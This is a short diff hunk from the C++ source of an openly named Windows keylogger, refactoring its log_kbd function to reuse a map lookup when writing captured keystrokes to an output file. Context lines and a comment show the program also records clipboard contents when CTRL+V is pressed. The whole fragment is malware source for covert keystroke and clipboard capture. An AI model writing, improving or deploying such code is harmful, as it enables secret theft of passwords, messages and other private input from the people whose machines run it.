@@ -8,10 +8,12 @@ void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
 {
     std::wofstream out_file{ configuration::out_file, std::wofstream::app };
 
+    const auto it = configuration::key_codes.find(kbd_hook->vkCode);
+
     // If the virtual-key code is in the key_codes map, write the respective value.
-    if (configuration::key_codes.find(kbd_hook->vkCode) != configuration::key_codes.end())
+    if (it != configuration::key_codes.end())
     {
-        out_file << configuration::key_codes.at(kbd_hook->vkCode);
+        out_file << it->second;
     }
     // If the control key is down, write the provided virtual-key code and write the
     // clipboard data in the case of CTRL + V.
